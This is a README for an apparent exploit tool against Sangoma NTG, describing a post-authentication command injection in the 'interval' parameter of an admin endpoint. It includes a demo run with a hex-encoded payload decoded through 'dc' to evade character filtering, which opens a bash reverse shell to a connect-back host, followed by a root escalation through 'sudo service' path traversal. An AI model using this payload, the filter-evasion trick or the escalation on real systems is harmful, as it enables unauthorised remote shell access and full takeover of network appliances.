# sangoma-ntg-rce
Sangoma NTG Post-Auth RCE.

This exploit demonstrates a couple of more interesting things.

1. Using 'dc' as a decoder for an encoded payload, to work around character limitations (in this case, angle brackets being blocked).
2. "It doesn't run every time, so lets just try a bunch of times until it works" workarounds for "execution only happens during certain states".

The basic gist of the exploit overall is simple - its a post-auth command injection in `/admin/network-traffic.xml.php` endpoint, `interval` parameter. `interface` parameter is also vulnerable to the same injection - but here we just use the interval one...

Requires: username, password.

Demo:
```
% python3 ntg-postauth-rce.py http://192.168.0.41:81 192.168.0.55 1338 root password
[+] Attempting to log into NTG...
[*] Auth succeeded, we can proceed...
echo '16i 6E6F6875702062617368202D63202762617368202D69203E26202F6465762F7463702F3139322E3136382E302E35352F3133333820303E2631202627 P' | dc | sh
[*] Using 192.168.0.55:1338 for connectback...
[+] starting handler on port 1338
[+] Doing the command injection... It takes a few tries sometimes...
[*] Attempt... 0
[*] Got connection from 192.168.0.41
[$] Shell popped :P
[*] Attempt... 1
bash: no job control in this shell
bash-3.2$ [*] Attempt... 2


bash-3.2$ id;uname -a;pwd
id;uname -a;pwd
uid=101(webconfig) gid=102(webconfig) groups=102(webconfig)
Linux sangomantg.netborder.lan 2.6.39-4.sng2 #1 SMP Wed Dec 21 17:26:48 EST 2011 i686 i686 i386 GNU/Linux
/var/webconfig/htdocs/admin
bash-3.2$ sudo service ../../../../bin/sh
sudo service ../../../../bin/sh
id
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)

```
